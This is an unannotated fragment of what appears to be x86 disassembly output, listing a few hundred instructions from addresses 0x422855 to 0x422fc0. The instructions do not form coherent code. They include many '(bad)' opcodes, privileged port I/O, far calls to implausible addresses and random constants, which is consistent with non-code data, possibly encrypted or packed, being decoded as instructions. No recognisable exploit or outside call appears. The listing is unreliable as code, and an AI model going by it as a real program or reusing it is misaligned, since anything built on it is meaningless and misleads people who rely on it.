  422855:	adc    ah,ah
  422857:	(bad)  
  422858:	not    DWORD PTR [eax+0x4289ebe1]
  42285e:	inc    ebp
  42285f:	pusha  
  422860:	sub    eax,0xc14d8d52
  422865:	adc    DWORD PTR [ecx+eax*8],esp
  422868:	add    BYTE PTR [ebp-0x5e],bl
  42286b:	xchg   ebp,eax
  42286c:	jle    0x422890
  42286e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42286f:	repz xchg esi,eax
  422871:	loope  0x422830
  422873:	sti    
  422874:	pop    edx
  422875:	add    DWORD PTR [ebx+0x43],edi
  422878:	clc    
  422879:	loopne 0x422871
  42287b:	jo     0x4228d1
  42287d:	push   0x41
  42287f:	xchg   edi,eax
  422880:	fiadd  WORD PTR [eax+edx*4]
  422883:	retf   0x8be1
  422886:	mov    esi,0xa4b63088
  42288b:	sub    eax,0x7670d38f
  422890:	ins    BYTE PTR es:[edi],dx
  422891:	out    0x63,al
  422893:	popa   
  422894:	scas   eax,DWORD PTR es:[edi]
  422895:	inc    esi
  422896:	lock into 
  422898:	mov    dh,0xa9
  42289a:	mov    fs,WORD PTR [ecx+0x59]
  42289d:	xlat   BYTE PTR ds:[ebx]
  42289e:	inc    ecx
  42289f:	mov    edi,0xc736cc6e
  4228a4:	push   ebx
  4228a5:	aad    0x21
  4228a7:	aad    0xf9
  4228a9:	test   al,0xec
  4228ab:	and    DWORD PTR ds:0x8f658072,0x6e91d9a0
  4228b5:	xor    BYTE PTR [ebp-0x43],ah
  4228b8:	mov    edx,0x774e8809
  4228bd:	dec    esp
  4228be:	mov    al,0x12
  4228c0:	mov    dl,0x68
  4228c2:	adc    DWORD PTR [edx-0x75],esi
  4228c5:	lods   eax,DWORD PTR ds:[esi]
  4228c6:	fistp  QWORD PTR [ebp-0x7ee84f3a]
  4228cc:	pop    ebx
  4228cd:	outs   dx,DWORD PTR ds:[esi]
  4228ce:	pop    ss
  4228cf:	add    ebx,DWORD PTR [edi+ecx*4-0x332e2abd]
  4228d6:	std    
  4228d7:	cmp    bl,cl
  4228d9:	sub    al,0xbd
  4228db:	push   ss
  4228dc:	arpl   WORD PTR [edx+0x1],ax
  4228df:	icebp  
  4228e0:	mov    DWORD PTR [esi-0x1eb8aff8],edx
  4228e6:	jecxz  0x42295e
  4228e8:	inc    ebp
  4228e9:	mov    ebp,0x6a9a7edb
  4228ee:	stos   DWORD PTR es:[edi],eax
  4228ef:	pusha  
  4228f0:	outs   dx,DWORD PTR ds:[esi]
  4228f1:	sbb    DWORD PTR [edi-0x2b112dd4],ebp
  4228f7:	call   0x5079:0x62e299a9
  4228fe:	(bad)  
  4228ff:	dec    edi
  422900:	(bad)  
  422901:	xor    eax,0x2b77c7d
  422906:	or     ah,BYTE PTR [ecx+0x26]
  422909:	and    BYTE PTR [esp+edx*8],cl
  42290c:	in     al,0xeb
  42290e:	popa   
  42290f:	mov    bh,BYTE PTR [esi+eiz*8-0x9]
  422913:	js     0x4228b6
  422915:	loope  0x422936
  422917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422918:	jp     0x422994
  42291a:	jo     0x42292a
  42291c:	or     DWORD PTR [edx],ebp
  42291e:	dec    eax
  42291f:	(bad)  
  422920:	push   0xffffff99
  422922:	test   ebp,edi
  422924:	mov    cl,0x46
  422926:	sbb    eax,0x78880bf1
  42292b:	(bad)  
  42292d:	jmp    0x93b2aaf0
  422932:	mov    al,0xd
  422934:	ficom  WORD PTR [eax-0x47]
  422937:	and    eax,DWORD PTR [esi+0x6]
  42293a:	jmp    0x7a64fd54
  42293f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422940:	inc    eax
  422941:	imul   esp,DWORD PTR [eax-0x7b],0x4c
  422945:	outs   dx,BYTE PTR ds:[esi]
  422946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422947:	sbb    al,0x41
  422949:	stc    
  42294a:	scas   eax,DWORD PTR es:[edi]
  42294b:	leave  
  42294c:	iret   
  42294d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42294e:	inc    ebx
  42294f:	adc    eax,0x42bf8caf
  422954:	mov    dl,0x2f
  422956:	jl     0x4229a7
  422958:	cmp    eax,0x131918e1
  42295d:	pop    edi
  42295e:	and    eax,0x20f71d62
  422963:	test   DWORD PTR [ecx+0x400e7a9e],eax
  422969:	out    dx,al
  42296a:	inc    edx
  42296b:	outs   dx,DWORD PTR ds:[esi]
  42296c:	add    dh,dl
  42296e:	jmp    FWORD PTR [di]
  422971:	call   0x45b74a16
  422976:	sahf   
  422977:	rcl    DWORD PTR [edx-0x60],1
  42297a:	dec    ecx
  42297b:	cmp    ah,BYTE PTR [ecx+eax*4-0x7b]
  42297f:	das    
  422980:	sar    esp,cl
  422982:	xchg   ecx,eax
  422983:	iret   
  422984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422985:	mov    ebx,0x7d15d4eb
  42298a:	push   0x324f4ca9
  42298f:	outs   dx,BYTE PTR ds:[esi]
  422990:	xchg   ebp,eax
  422991:	mov    esp,0x614c834c
  422996:	aas    
  422997:	fisttp DWORD PTR [esi-0x49c46ad7]
  42299d:	mov    WORD PTR [edx+ebp*4],fs
  4229a0:	aas    
  4229a1:	and    bh,BYTE PTR [eax+0x39]
  4229a4:	dec    edi
  4229a5:	push   0x5a
  4229a7:	or     esp,DWORD PTR [ebx+ebp*4]
  4229aa:	pop    ecx
  4229ab:	lods   al,BYTE PTR ds:[esi]
  4229ac:	nop
  4229ad:	xor    BYTE PTR [esi+0x59d6f4c0],al
  4229b3:	jne    0x4229fe
  4229b5:	loope  0x4229d2
  4229b7:	inc    eax
  4229b8:	js     0x42299c
  4229ba:	xchg   esi,eax
  4229bb:	leave  
  4229bc:	fwait
  4229bd:	out    dx,eax
  4229be:	ffree  st(3)
  4229c0:	add    ebx,DWORD PTR [edi-0x7c]
  4229c3:	fiadd  DWORD PTR [esi]
  4229c5:	test   DWORD PTR [edi-0x6c355ef2],esi
  4229cb:	jle    0x4229e2
  4229cd:	pop    ebx
  4229ce:	push   es
  4229cf:	aad    0x83
  4229d1:	mov    edx,0xb0491074
  4229d6:	in     eax,dx
  4229d7:	sub    al,0xa8
  4229d9:	fadd   DWORD PTR [edx]
  4229db:	fidivr DWORD PTR [edi+0xd]
  4229de:	dec    ebx
  4229df:	add    eax,0x4333769c
  4229e4:	inc    BYTE PTR [esi-0x4]
  4229e7:	sub    al,0x9a
  4229e9:	ins    BYTE PTR es:[edi],dx
  4229ea:	(bad)  
  4229ec:	(bad)  
  4229ed:	and    al,0xc9
  4229ef:	pushf  
  4229f0:	or     DWORD PTR [edi-0x413eefb],ebx
  4229f6:	push   ebp
  4229f7:	repz cmp DWORD PTR [ebp-0x6f1e27fe],edx
  4229fe:	imul   edx,ecx,0x29
  422a01:	hlt    
  422a02:	fbld   TBYTE PTR [edx-0x64]
  422a05:	add    esi,DWORD PTR [edx-0x5]
  422a08:	jmp    0x4229eb
  422a0a:	cmp    eax,0x8ac7552c
  422a0f:	mov    bl,0xeb
  422a11:	ror    BYTE PTR [eax+0x4],cl
  422a14:	js     0x422a57
  422a16:	call   0x2f368c3f
  422a1b:	and    BYTE PTR [ebp+0x49],al
  422a1e:	enter  0xea4b,0xca
  422a22:	push   0xa836ecf1
  422a27:	je     0x422a1a
  422a29:	mov    ecx,0xc15e4e32
  422a2e:	loop   0x422a05
  422a30:	pushf  
  422a31:	xchg   esp,eax
  422a32:	mov    eax,ds:0xa5ab004b
  422a37:	xchg   edi,eax
  422a38:	fs cmp bh,bh
  422a3b:	xor    BYTE PTR [esp+eax*8+0x44c3a6f0],ah
  422a42:	cdq    
  422a43:	dec    ebx
  422a44:	call   0x18cf21f3
  422a49:	adc    BYTE PTR [edx+0x42],0xa2
  422a4d:	and    ebp,ebp
  422a4f:	int    0x9
  422a51:	xor    DWORD PTR [ebp+0x77],ebx
  422a54:	jno    0x422a33
  422a56:	pop    es
  422a57:	jae    0x422a98
  422a59:	dec    edx
  422a5a:	jge    0x422a53
  422a5c:	cs pop ebx
  422a5e:	mov    cl,0x59
  422a60:	mov    edx,0xa623cf7
  422a65:	mov    al,0xf4
  422a67:	or     BYTE PTR [edx-0x26293148],al
  422a6d:	pop    es
  422a6e:	jnp    0x422a69
  422a70:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  422a72:	inc    edx
  422a73:	cmp    al,0xfc
  422a75:	jmp    0xc1826165
  422a7a:	ins    BYTE PTR es:[edi],dx
  422a7b:	mov    ds:0x395aeacf,al
  422a80:	mul    DWORD PTR [ecx]
  422a82:	and    eax,0xbef0c763
  422a87:	jns    0x422aa7
  422a89:	add    esi,DWORD PTR [edx+0x3028c134]
  422a8f:	and    esi,esp
  422a91:	fdivr  st(2),st
  422a93:	ret    0xd349
  422a96:	in     al,dx
  422a97:	push   es
  422a98:	sbb    esp,DWORD PTR [eax+0x22]
  422a9b:	xor    BYTE PTR [esi+esi*4-0x18],bh
  422a9f:	fistp  WORD PTR [ebx+edi*2]
  422aa2:	aam    0x7f
  422aa4:	nop
  422aa5:	inc    esp
  422aa6:	xchg   edi,eax
  422aa7:	or     dl,BYTE PTR [ebp+0xf7f1e4e]
  422aad:	adc    al,BYTE PTR [edi+0x78]
  422ab0:	jmp    DWORD PTR [ebp+0x2e21b878]
  422ab6:	pop    eax
  422ab7:	call   0x1bcd:0x21679b36
  422abe:	into   
  422abf:	adc    DWORD PTR [esi],0xb0085ed6
  422ac5:	aaa    
  422ac6:	aam    0x1b
  422ac8:	inc    edi
  422ac9:	outs   dx,DWORD PTR ds:[esi]
  422aca:	pop    ss
  422acb:	test   WORD PTR [eax],0x0
  422ad0:	add    BYTE PTR [eax],al
  422ad2:	(bad)  
  422ad3:	xlat   BYTE PTR ds:[ebx]
  422ad4:	hlt    
  422ad5:	push   ebp
  422ad7:	jmp    FWORD PTR [ebx-0x21]
  422ada:	sub    al,0x7c
  422adc:	cmp    BYTE PTR [edx+0x633febd2],bh
  422ae2:	push   edi
  422ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ae4:	add    DWORD PTR [eax],eax
  422ae6:	repz add al,0x0
  422ae9:	add    ah,ch
  422aeb:	xor    al,0xa9
  422aed:	test   DWORD PTR [esi],edx
  422aef:	mov    esp,0xa85c2523
  422af4:	daa    
  422af5:	inc    edx
  422af6:	int3   
  422af7:	adc    al,0x96
  422af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422afa:	pop    ss
  422afb:	(bad)  
  422afc:	je     0x422a8c
  422afe:	fs xchg ebx,eax
  422b00:	mov    edx,0x138b3bff
  422b05:	push   ebx
  422b06:	test   al,0xaf
  422b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b09:	xchg   edx,eax
  422b0a:	jecxz  0x422b2f
  422b0c:	mov    WORD PTR [edi-0x4a7319cd],?
  422b12:	cmp    BYTE PTR [edx+0x1],bl
  422b15:	mov    ebx,0x66f18bd1
  422b1a:	stos   DWORD PTR es:[edi],eax
  422b1b:	in     eax,0x6b
  422b1d:	fnstsw WORD PTR [edx-0x20482650]
  422b23:	std    
  422b24:	fcmovnu st,st(4)
  422b26:	xchg   edi,eax
  422b27:	inc    edx
  422b28:	xlat   BYTE PTR ds:[ebx]
  422b29:	cmp    bh,ch
  422b2b:	fwait
  422b2c:	adc    eax,0x33435c4e
  422b31:	mov    esp,DWORD PTR [ebx]
  422b33:	mov    al,ds:0xa1f555db
  422b38:	mov    ebx,fs
  422b3a:	mov    WORD PTR [ecx+ecx*8-0xf],es
  422b3e:	in     eax,0xfe
  422b40:	mov    ds:0x99d085a0,eax
  422b45:	sub    BYTE PTR [esi],al
  422b47:	dec    ebp
  422b48:	std    
  422b49:	cdq    
  422b4a:	xchg   esp,eax
  422b4b:	sbb    al,0xd3
  422b4d:	lods   eax,DWORD PTR ds:[esi]
  422b4e:	arpl   WORD PTR [ecx+esi*1],dx
  422b51:	repnz outs dx,DWORD PTR ds:[esi]
  422b53:	sub    ebx,DWORD PTR [edx]
  422b55:	mov    al,0x61
  422b57:	xchg   DWORD PTR [esi+0x40],eax
  422b5a:	xadd   BYTE PTR [ebx+0x62ce5170],dl
  422b61:	outs   dx,BYTE PTR ds:[esi]
  422b62:	push   ebp
  422b63:	pop    ebp
  422b64:	div    BYTE PTR [ebx]
  422b66:	sub    DWORD PTR ds:0xb34aee85,edx
  422b6c:	cmp    eax,0xa9b80b84
  422b71:	fs mov bh,0xc8
  422b74:	das    
  422b75:	dec    edi
  422b76:	jne    0x422be7
  422b78:	cli    
  422b79:	xor    eax,0xfb6f4cf7
  422b7e:	sub    eax,0x3b95673a
  422b83:	ja     0x422bc1
  422b85:	cld    
  422b86:	dec    ecx
  422b87:	mov    esi,0x7e667fcb
  422b8c:	xor    BYTE PTR [esi+ecx*8-0x1b],bh
  422b90:	xchg   ebx,eax
  422b91:	sar    BYTE PTR ds:0x56865371,0xf9
  422b98:	enter  0x3414,0x60
  422b9c:	add    al,0xff
  422b9e:	sub    al,0xc8
  422ba0:	test   al,0x93
  422ba2:	mov    cl,0x10
  422ba4:	cmc    
  422ba5:	xchg   esp,eax
  422ba6:	mov    dh,0x13
  422ba8:	push   ss
  422ba9:	call   edi
  422bab:	mov    edx,0x2bdb9d43
  422bb0:	pop    esp
  422bb1:	test   al,0xe
  422bb3:	aaa    
  422bb4:	xor    eax,0x8123035c
  422bb9:	test   DWORD PTR [esi+0x6305c578],esp
  422bbf:	clc    
  422bc0:	xor    eax,0x9895cb9c
  422bc5:	leave  
  422bc6:	addr16 ss loope 0x422c10
  422bca:	or     bh,BYTE PTR [eax]
  422bcc:	mov    ebx,ebp
  422bce:	pop    ebp
  422bcf:	adc    BYTE PTR [edi+0x63664f80],cl
  422bd5:	lods   al,BYTE PTR ds:[esi]
  422bd6:	and    ebp,esi
  422bd8:	int3   
  422bd9:	and    al,0x81
  422bdb:	dec    edi
  422bdc:	and    bl,0xce
  422bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422be0:	in     al,0x4a
  422be2:	mov    al,ds:0xa842d8c7
  422be7:	xchg   esp,eax
  422be8:	sbb    BYTE PTR [esi],ch
  422bea:	jmp    0x240e:0xeb407a8d
  422bf1:	pop    ebx
  422bf2:	fisub  DWORD PTR [eax-0x32]
  422bf5:	or     eax,0x39aad533
  422bfa:	pop    ds
  422bfb:	stos   BYTE PTR es:[edi],al
  422bfc:	fidivr DWORD PTR [ecx-0x3a]
  422bff:	in     al,0xb3
  422c01:	or     eax,0xd42bad86
  422c06:	pop    esp
  422c07:	sbb    DWORD PTR [esi+0x51],eax
  422c0a:	mov    BYTE PTR fs:[edi+0x1e5cd948],ch
  422c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c12:	lahf   
  422c13:	es mov dl,0x9c
  422c16:	adc    al,al
  422c18:	iret   
  422c19:	cmp    dh,ch
  422c1b:	mov    ecx,edi
  422c1d:	xor    al,0x9
  422c1f:	test   dh,bh
  422c21:	ret    
  422c22:	popf   
  422c23:	sbb    al,0xf2
  422c25:	icebp  
  422c26:	and    esp,DWORD PTR [eax+0x1d923e5a]
  422c2c:	sbb    BYTE PTR [ebx-0x49091887],dl
  422c32:	arpl   sp,sp
  422c34:	jecxz  0x422c52
  422c36:	xor    DWORD PTR [edx],esi
  422c38:	lahf   
  422c39:	in     eax,0xcf
  422c3b:	in     eax,0x61
  422c3d:	and    al,BYTE PTR ds:0x4f884059
  422c43:	pusha  
  422c44:	iret   
  422c45:	jl     0x422c18
  422c47:	ss inc ebx
  422c49:	dec    eax
  422c4a:	and    BYTE PTR [ecx-0x3fa5f2d1],al
  422c50:	mov    dh,0xe3
  422c52:	pop    ds
  422c53:	pop    ss
  422c54:	and    BYTE PTR [ebx-0x2f],bh
  422c57:	arpl   WORD PTR [ecx+0x5a],ax
  422c5a:	arpl   WORD PTR [ebx],di
  422c5c:	call   0x54e9:0xb92ea0e6
  422c63:	dec    ebp
  422c64:	aad    0x60
  422c66:	retf   0x264c
  422c69:	icebp  
  422c6a:	mov    edx,0x5f957dc3
  422c6f:	js     0x422c5c
  422c71:	xchg   esp,eax
  422c72:	add    eax,0x9d2cefcd
  422c77:	xor    eax,0xf9f44ff6
  422c7c:	rcr    DWORD PTR fs:[ecx],cl
  422c7f:	mov    al,0x7
  422c81:	or     eax,0xbe4dd4e
  422c86:	mov    ah,0x52
  422c88:	jns    0x422c69
  422c8a:	(bad)  
  422c8b:	cmp    cl,BYTE PTR [ebp-0x4a]
  422c8e:	mov    al,ds:0x4e5563a2
  422c93:	mov    edx,0xc55c3638
  422c98:	pop    ebp
  422c99:	and    al,dl
  422c9b:	in     eax,dx
  422c9c:	mov    dh,bl
  422c9e:	shl    BYTE PTR [ecx+0x574f6f2e],0x7c
  422ca5:	es jge 0x422cb2
  422ca8:	test   ebx,0xc6302c9b
  422cae:	jnp    0x422c9a
  422cb0:	or     ebp,DWORD PTR [ebp-0x62]
  422cb3:	div    al
  422cb5:	jmp    DWORD PTR ds:0x55281ff5
  422cbb:	test   DWORD PTR [esi],esp
  422cbd:	inc    eax
  422cbe:	push   ds
  422cbf:	dec    ebp
  422cc0:	into   
  422cc1:	jecxz  0x422d0e
  422cc3:	xor    al,0x6
  422cc5:	(bad)  
  422cc6:	out    dx,eax
  422cc7:	aas    
  422cc8:	lods   eax,DWORD PTR ds:[esi]
  422cc9:	lods   al,BYTE PTR ds:[esi]
  422cca:	mov    ebp,0x38617f2
  422ccf:	(bad)  
  422cd0:	(bad)  
  422cd1:	dec    esi
  422cd2:	imul   BYTE PTR [edx-0x2e652bcb]
  422cd8:	dec    ecx
  422cd9:	fbld   TBYTE PTR [ebx+0x5c]
  422cdc:	mov    cl,0x12
  422cde:	aaa    
  422cdf:	xchg   esi,eax
  422ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ce1:	push   edx
  422ce2:	mov    ebp,0xe6fad393
  422ce7:	add    eax,0x1f049a33
  422cec:	loopne 0x422ce5
  422cee:	mov    esi,0x6a1e5423
  422cf3:	add    eax,0x88a7b466
  422cf8:	sub    eax,0x3d96059
  422cfd:	and    ebp,esp
  422cff:	mov    al,0xde
  422d01:	or     DWORD PTR [eax],edx
  422d03:	sar    BYTE PTR ds:0x8af2a536,1
  422d09:	ds push esi
  422d0b:	fmul   st(0),st
  422d0d:	or     DWORD PTR [edx],esi
  422d0f:	pop    edx
  422d10:	cmp    edx,DWORD PTR [eax+esi*4-0x31]
  422d14:	inc    edx
  422d15:	push   ebp
  422d16:	sub    al,bl
  422d18:	neg    BYTE PTR [esi-0x1c]
  422d1b:	hlt    
  422d1c:	mov    edi,0x4c3b44d5
  422d21:	enter  0x2600,0xd4
  422d25:	pop    ebx
  422d26:	clc    
  422d27:	(bad)  
  422d28:	jmp    0x422d47
  422d2a:	jo     0x422d60
  422d2c:	add    eax,0x8262a124
  422d31:	mov    eax,0xc5e93dc9
  422d36:	scas   eax,DWORD PTR es:[edi]
  422d37:	mov    ds:0xaf30de3e,eax
  422d3c:	stos   BYTE PTR es:[edi],al
  422d3d:	jge    0x422d81
  422d3f:	inc    ebx
  422d40:	ins    DWORD PTR es:[edi],dx
  422d41:	stos   BYTE PTR es:[edi],al
  422d42:	pop    ebp
  422d43:	sbb    dl,BYTE PTR [edx+0x28856437]
  422d49:	aam    0x38
  422d4b:	clc    
  422d4c:	ffree  st(0)
  422d4e:	sbb    ecx,DWORD PTR [edi-0x14]
  422d51:	repnz out 0xef,eax
  422d54:	out    0xd,eax
  422d56:	sti    
  422d57:	mov    eax,0xe700af12
  422d5c:	sbb    bh,BYTE PTR [esi+0x66]
  422d5f:	xlat   BYTE PTR ds:[ebx]
  422d60:	mov    edi,0xbb0c106c
  422d65:	ss dec esi
  422d67:	sbb    edx,eax
  422d69:	jne    0x422d14
  422d6b:	push   edx
  422d6c:	dec    ecx
  422d6d:	fistp  WORD PTR [eax+eiz*4]
  422d70:	mov    bl,BYTE PTR [edi+0x6a]
  422d73:	(bad)  
  422d74:	jae    0x422dae
  422d76:	xchg   ecx,eax
  422d77:	nop
  422d78:	fild   WORD PTR [edi-0x11]
  422d7b:	jb     0x422d58
  422d7d:	dec    ebx
  422d7e:	(bad)  
  422d7f:	mov    cl,BYTE PTR [ebp-0x40]
  422d82:	int3   
  422d83:	dec    esi
  422d84:	loop   0x422df0
  422d86:	ret    0x6129
  422d89:	stos   DWORD PTR es:[edi],eax
  422d8a:	stc    
  422d8b:	adc    eax,0xcda99ef0
  422d90:	daa    
  422d91:	psllw  mm6,QWORD PTR [eax]
  422d94:	dec    edi
  422d95:	mov    ch,0x99
  422d97:	xchg   ebx,eax
  422d98:	mov    esp,0xadeb1294
  422d9d:	nop
  422d9e:	loope  0x422d67
  422da0:	inc    ecx
  422da1:	xor    BYTE PTR [ecx-0x254916d0],dh
  422da7:	(bad)  
  422da8:	xchg   edi,eax
  422da9:	xlat   BYTE PTR ds:[ebx]
  422daa:	sbb    ecx,eax
  422dac:	mov    dl,0xa6
  422dae:	sub    cl,BYTE PTR [ecx+ebx*2-0x397eb574]
  422db5:	scas   al,BYTE PTR es:[edi]
  422db6:	sahf   
  422db7:	sbb    ecx,DWORD PTR [edi]
  422db9:	inc    eax
  422dba:	(bad)  
  422dbb:	xchg   ebp,eax
  422dbc:	adc    BYTE PTR [ebx],ch
  422dbe:	or     BYTE PTR [esi-0x774e7e46],0x5e
  422dc5:	jmp    0x422e12
  422dc7:	sub    bh,BYTE PTR [edx+ebp*1]
  422dca:	shr    BYTE PTR [ebp+eiz*1-0x1c],cl
  422dce:	scas   al,BYTE PTR es:[edi]
  422dcf:	inc    eax
  422dd0:	xchg   DWORD PTR [esi+0x56],edx
  422dd3:	fsub   QWORD PTR [eax]
  422dd5:	arpl   WORD PTR [esi-0x7fe0c74f],dx
  422ddb:	xchg   ebp,eax
  422ddc:	pop    eax
  422ddd:	es jo  0x422db3
  422de0:	retf   
  422de1:	fsubp  st(7),st
  422de3:	and    eax,DWORD PTR [eax-0x1c]
  422de6:	jns    0x422db6
  422de8:	js     0x422dd4
  422dea:	xor    ecx,DWORD PTR [ebx-0x2033bf56]
  422df0:	cmp    DWORD PTR [edx+0x25],ebp
  422df3:	mov    dl,0xba
  422df5:	or     DWORD PTR [edi+esi*1],edx
  422df8:	inc    ebp
  422df9:	into   
  422dfa:	push   eax
  422dfb:	sbb    DWORD PTR [edi-0x66],edi
  422dfe:	inc    edi
  422dff:	pop    ss
  422e00:	or     DWORD PTR [edx-0x78],edi
  422e03:	xchg   ecx,eax
  422e04:	std    
  422e05:	cmp    BYTE PTR [edx+ebx*4],bh
  422e08:	mov    esi,0xa84ab408
  422e0d:	xchg   ecx,eax
  422e0e:	add    esp,edx
  422e10:	dec    ecx
  422e11:	cdq    
  422e12:	scas   eax,DWORD PTR es:[edi]
  422e13:	dec    esp
  422e14:	jns    0x422e0f
  422e16:	inc    ebx
  422e17:	pop    eax
  422e18:	ds pop ss
  422e1a:	mov    cl,dh
  422e1c:	sti    
  422e1d:	jg     0x422de7
  422e1f:	cmovle eax,DWORD PTR [eax+edx*8-0x7d0bead]
  422e27:	sbb    BYTE PTR [eax],dh
  422e29:	shl    eax,1
  422e2b:	xor    BYTE PTR [esp+ecx*1-0x62b93fe0],bl
  422e32:	idiv   edx
  422e34:	(bad)  
  422e35:	push   edx
  422e36:	sbb    eax,0x9153b29e
  422e3b:	(bad)  
  422e3d:	popf   
  422e3e:	outs   dx,DWORD PTR ds:[esi]
  422e3f:	dec    edx
  422e40:	lds    edi,FWORD PTR [edx]
  422e42:	and    eax,DWORD PTR [edi-0x78]
  422e45:	retf   0x4e7a
  422e48:	pop    ebx
  422e49:	data16 fucom st(5)
  422e4c:	sar    BYTE PTR [eax+ebx*2+0x7b],0xdb
  422e51:	in     al,dx
  422e52:	addr16 xchg edi,eax
  422e54:	addr16 in al,dx
  422e56:	rcr    DWORD PTR ds:0x3cbcf620,1
  422e5c:	cdq    
  422e5d:	divps  xmm5,xmm6
  422e60:	sbb    BYTE PTR ds:0x4c20b786,bl
  422e66:	lods   eax,DWORD PTR ds:[esi]
  422e67:	inc    eax
  422e68:	test   eax,0x9f9e5dea
  422e6d:	pusha  
  422e6e:	mov    WORD PTR [esi],gs
  422e70:	push   cs
  422e71:	xor    DWORD PTR [ebx],esp
  422e73:	mov    edi,0xeec4a7cd
  422e78:	and    BYTE PTR [ebx],bl
  422e7a:	stc    
  422e7b:	leave  
  422e7c:	in     al,0xc7
  422e7e:	in     eax,0xe7
  422e80:	inc    edx
  422e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e82:	js     0x422e2a
  422e84:	lds    esp,FWORD PTR [esp+ebp*4]
  422e87:	pop    esi
  422e88:	arpl   bp,bx
  422e8a:	or     DWORD PTR [edi+0x3],0xcc55dbe3
  422e91:	mov    edx,DWORD PTR [ebx+edx*4+0x1e]
  422e95:	sbb    eax,0xb4ab6579
  422e9a:	add    esp,DWORD PTR [ecx]
  422e9c:	sbb    ah,BYTE PTR [edi-0x54f94712]
  422ea2:	out    0xf7,al
  422ea4:	stos   DWORD PTR es:[edi],eax
  422ea5:	cld    
  422ea6:	leave  
  422ea7:	loope  0x422edf
  422ea9:	scas   al,BYTE PTR es:[edi]
  422eaa:	inc    edi
  422eab:	icebp  
  422eac:	push   eax
  422ead:	push   ss
  422eae:	or     al,0xea
  422eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eb1:	mov    ds:0x7fd8eae3,eax
  422eb6:	xchg   ebp,eax
  422eb7:	sbb    ecx,eax
  422eb9:	sar    esp,1
  422ebb:	shl    DWORD PTR [edx],0xa6
  422ebe:	cli    
  422ebf:	mov    edi,0x27e4a5a5
  422ec4:	jns    0x422ead
  422ec6:	and    al,BYTE PTR [esi-0x655077fc]
  422ecc:	xchg   ebp,eax
  422ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ece:	and    eax,DWORD PTR [eax+eiz*8]
  422ed1:	and    DWORD PTR [ebx-0x66],ebp
  422ed4:	xor    dl,BYTE PTR [ecx+0x64b0ff5f]
  422eda:	push   edx
  422edb:	pop    esp
  422edc:	retf   0x109b
  422edf:	aam    0x50
  422ee1:	ficom  DWORD PTR [ecx+0x161e13b2]
  422ee7:	inc    ecx
  422ee8:	or     DWORD PTR [edx-0x595e0ae3],0x6a
  422eef:	repnz pop ecx
  422ef1:	dec    ebp
  422ef2:	push   ss
  422ef3:	(bad)  
  422ef4:	gs push esi
  422ef6:	dec    edi
  422ef7:	bound  edi,QWORD PTR [ebx]
  422ef9:	sub    eax,0x85ba2f28
  422efe:	xor    DWORD PTR [eax+0x6a],esp
  422f01:	ins    DWORD PTR es:[edi],dx
  422f02:	call   0xcc73ac2b
  422f07:	enter  0x593b,0xd
  422f0b:	pushf  
  422f0c:	pop    esp
  422f0d:	ins    DWORD PTR es:[edi],dx
  422f0e:	repnz pop ebp
  422f10:	idiv   DWORD PTR [esi-0x12]
  422f13:	xor    BYTE PTR [ecx-0x55f4c7f6],0xf1
  422f1a:	jle    0x422f83
  422f1c:	aaa    
  422f1d:	stos   BYTE PTR es:[edi],al
  422f1e:	(bad)  
  422f1f:	fsub   QWORD PTR [edx]
  422f21:	pop    es
  422f22:	jl     0x422f82
  422f24:	pop    eax
  422f25:	aad    0x99
  422f27:	vpsubw xmm6,xmm7,XMMWORD PTR [esi]
  422f2b:	test   ecx,eax
  422f2d:	adc    dh,BYTE PTR [ebp-0x252c5958]
  422f33:	lock add BYTE PTR [edi],bl
  422f36:	call   0x8ed4:0xaa5ee8ea
  422f3d:	mov    esp,0x2256b995
  422f42:	imul   eax,eax,0x21c30093
  422f48:	cmp    eax,0x9a4261da
  422f4d:	outs   dx,BYTE PTR ds:[esi]
  422f4e:	pop    ss
  422f4f:	mov    dl,0x16
  422f51:	mov    edi,0xe189b103
  422f56:	inc    esp
  422f57:	cli    
  422f58:	sub    DWORD PTR [esi-0x106df09c],edx
  422f5e:	cmp    BYTE PTR [edi],0x1b
  422f61:	enter  0x3fdd,0x45
  422f65:	fstp   QWORD PTR [eax]
  422f67:	hlt    
  422f68:	mov    al,0xfe
  422f6a:	xchg   esi,eax
  422f6b:	adc    eax,0x35c7cd25
  422f70:	popf   
  422f71:	push   es
  422f72:	int3   
  422f73:	js     0x422f0b
  422f75:	jl     0x422fb0
  422f77:	push   edi
  422f78:	mov    edi,0x2a94b22
  422f7d:	cmc    
  422f7e:	clc    
  422f7f:	neg    DWORD PTR [eax-0x2087cb70]
  422f85:	int    0xb
  422f87:	mov    ebp,0x90e9ad9d
  422f8c:	or     al,0x2f
  422f8e:	pop    ebx
  422f8f:	outs   dx,DWORD PTR ds:[esi]
  422f90:	pop    es
  422f91:	xlat   BYTE PTR ds:[ebx]
  422f92:	pop    ebp
  422f93:	repz neg BYTE PTR [edi+0xa111bc1]
  422f9a:	into   
  422f9b:	push   eax
  422f9c:	test   BYTE PTR [eax+0x5c31781c],bl
  422fa2:	(bad)  
  422fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fa5:	fnstsw WORD PTR [ebx-0x36]
  422fa8:	stc    
  422fa9:	pusha  
  422faa:	and    ebx,DWORD PTR [edx-0xfd2e298]
  422fb0:	xchg   ebx,eax
  422fb1:	mov    edx,0x4cee8069
  422fb6:	xor    edi,DWORD PTR [edx]
  422fb8:	mov    ah,0x6e
  422fba:	push   DWORD PTR [edx+esi*4-0x12]
  422fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fbf:	(bad)  
  422fc0:	mov    ss,WORD PTR [edx]
